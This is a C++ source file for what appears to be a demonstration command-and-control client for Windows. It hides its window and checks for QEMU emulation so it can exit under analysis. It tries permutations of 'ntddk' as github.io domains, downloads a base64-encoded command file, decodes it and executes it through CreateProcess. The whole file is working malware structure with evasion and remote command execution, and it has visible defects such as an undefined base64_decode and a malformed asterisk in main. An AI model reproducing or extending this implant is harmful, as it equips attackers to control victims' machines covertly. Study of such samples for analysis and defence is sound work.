// c2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <urlmon.h>
#include <string>
#include <algorithm>
#include <iostream>
#include <codecvt> 
using namespace std;

#pragma comment(lib, "urlmon.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

static int antiQEMU()
{
	__try{
		_asm{
			// A. Dinaburg, et.al. Ether: Malware Analysis via Hardware Virtualization Extensions. ACM CCS. 2008.
			rep rep rep rep rep rep rep rep rep rep rep rep rep rep rep nop;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER){
		return 0;
	}
	exit(1);
}

std::wstring genDomain()
{
	std::wstring pre = L"http://";
	std::wstring bod = L"ddknt";
	std::wstring suf = L".github.io/c2/";
	std::wstring dom;
	std::wstring dat = L"config.dat";
	HRESULT hr;
	std::sort(bod.begin(), bod.end());
	do { // 擬似DGA
		dom = pre + bod + suf;
		hr = URLDownloadToFile(0, (LPCWSTR)dom.c_str(), dat.c_str(), 0, 0);
		if (hr == S_OK) break;
	} while (std::next_permutation(bod.begin(), bod.end())); // "ntddk"の順列
	return dat;
}

std::wstring decodeCmd(std::wstring dat)
{
	HANDLE hFile;
	BOOL bRet;
	char szBuff[1024];
	DWORD dwNumberOfReadBytes;
	hFile = CreateFile((LPCWSTR)dat.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) exit(1);
	bRet = ReadFile(hFile, szBuff, sizeof(szBuff) / sizeof(szBuff[0]), &dwNumberOfReadBytes, NULL);
	CloseHandle(hFile);
	std::string encoded_string(szBuff, 1024);
	std::string decoded_string = base64_decode(encoded_string); // base64デコード
	std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> cv;
	std::wstring cmd = cv.from_bytes(decoded_string);
	return cmd;
}

static int cmdHandler(std::wstring cmd)
{
	STARTUPINFO info = { 0, };
	PROCESS_INFORMATION pi;
	info.cb = sizeof(info);
	SYSTEM_INFO sysInfo;
	switch ((int)cmd.front())
	{
	case 99: // calc.exe
		SetCurrentDirectory(L"C:\\WINDOWS\\system32");
		CreateProcess((LPCWSTR)cmd.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &pi);
		break;
	case 115: // sysinfo
		GetSystemInfo(&sysInfo); std::cout << sysInfo.dwNumberOfProcessors << std::endl;
		break;
	}
	return 0;
}

int main(int argc, char ∗argv[])
{
	antiQEMU();
	cmdHandler(decodeCmd(genDomain()));
	return 0;
}